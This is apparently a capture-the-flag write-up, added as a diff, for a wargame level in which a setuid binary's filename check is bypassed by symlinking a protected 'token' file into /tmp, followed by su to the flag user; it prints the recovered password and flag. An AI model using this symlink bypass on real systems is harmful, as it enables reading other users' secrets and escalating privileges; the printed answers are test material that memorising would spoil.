@@ -1,0 +1,26 @@
+# In the home repository we can found a level08 binary that will be executed by flag08 user by owner and group
+
+# With strings we can see that the binary is waiting for an argument (a file thanks to the error message) and it will read in it
+# The second file that we have is named 'token' in the home repository, only the flag08 can open it directly
+# The idea is to give a file that level08 have access to the level08 binary
+# Create a symlink of ~/token in /tmp folder (we can write in)
+
+ln -s ~/token /tmp/flag
+
+# The symlink name musn't contains 'token', the program will check for that.
+# Once the symlink is done, just give the symlink path into the binary, it will read into token file
+
+cd ~
+./level08 /tmp/flag
+
+=> quif5eloekouj29ke0vouxean
+
+# Connect to flag08 and get the flag
+
+su flag08
+quif5eloekouj29ke0vouxean
+
+# Get the flag
+
+getflag
+25749xKZ8L7DkSCwJkT9dyv6f
